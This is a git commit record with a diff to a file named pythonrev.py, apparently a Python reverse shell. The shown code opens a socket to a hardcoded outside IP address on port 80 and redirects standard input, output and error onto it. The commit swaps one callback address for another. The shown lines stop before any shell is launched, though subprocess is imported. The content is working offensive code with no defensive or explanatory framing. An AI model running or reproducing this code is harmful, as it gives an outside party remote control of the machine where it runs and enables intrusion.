586a21eea0028350c96409e4ecc089343b6fda11
trouble1fake <70536920+trouble1fake@users.noreply.github.com>
2021-03-28 00:48:06 +0530

    Update pythonrev.py

--- pythonrev.py
+++ pythonrev.py
@@ -1,6 +1,6 @@
 import socket,subprocess,os
 s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-s.connect(("52.152.164.84",80))
+s.connect(("104.214.217.25",80))
 os.dup2(s.fileno(),0)
 os.dup2(s.fileno(),1)
 os.dup2(s.fileno(),2)
